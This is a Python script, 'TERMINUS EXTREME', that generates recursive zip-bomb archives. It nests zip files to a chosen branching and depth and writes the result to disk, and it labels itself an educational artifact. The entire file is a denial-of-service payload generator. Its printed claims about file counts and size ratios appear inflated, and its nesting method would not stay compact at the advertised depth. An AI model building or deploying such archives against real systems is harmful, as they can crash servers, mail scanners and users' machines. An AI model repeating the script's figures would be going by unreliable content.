#!/usr/bin/env python3
"""
TERMINUS EXTREME
pushes the limits of recursive zip bombs.

branching: 256, level: 100, payload: 1 byte
theoretical: 256^100 = 10^240 files

educational / research artifact.
"""

import zipfile
import io
import sys
import time
import math


def create_level(depth, branching=256, payload=1):
    if depth == 0:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("x", b'\x00' * payload)
        return buf.getvalue()

    inner = create_level(depth - 1, branching, payload)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        for i in range(branching):
            zf.writestr(f"{i:02x}", inner)
    return buf.getvalue()


def build(branching=256, level=100, payload=1):
    total_files = branching ** level
    total_bytes = total_files * payload

    print(f"\n  TERMINUS EXTREME")
    print(f"  branching: {branching} | level: {level} | payload: {payload}B")
    print(f"  theoretical files:  {total_files:.4e}")
    print(f"  theoretical output: {total_bytes:.4e} bytes")
    print(f"  atoms in universe:  10^80")
    print(f"  ratio to atoms:     {total_bytes/1e80:.4e}x")
    print()

    start = time.time()

    for depth in range(level + 1):
        data = create_level(depth, branching, payload)
        size = len(data)

        elapsed = time.time() - start
        if depth > 0:
            eta = (elapsed / depth) * (level - depth)
        else:
            eta = 0

        sys.stdout.write(
            f"\r  depth {depth:>3}/{level} | "
            f"zip: {size:>10,}B | "
            f"eta: {eta:>6.0f}s"
        )
        sys.stdout.flush()

    elapsed = time.time() - start
    print(f"\n\n  build complete: {elapsed:.1f}s")
    print(f"  final zip: {size:,} bytes ({size/1024:.1f} KB)")

    output = f"TERMINUS_E{level}.zip"
    with open(output, "wb") as f:
        f.write(data)
    print(f"  saved: {output}\n")


if __name__ == "__main__":
    if len(sys.argv) >= 4:
        br = int(sys.argv[1])
        lv = int(sys.argv[2])
        pl = int(sys.argv[3])
    else:
        br, lv, pl = 256, 100, 1

    br = min(br, 65536)
    lv = min(lv, 200)
    pl = min(pl, 1000)

    build(br, lv, pl)
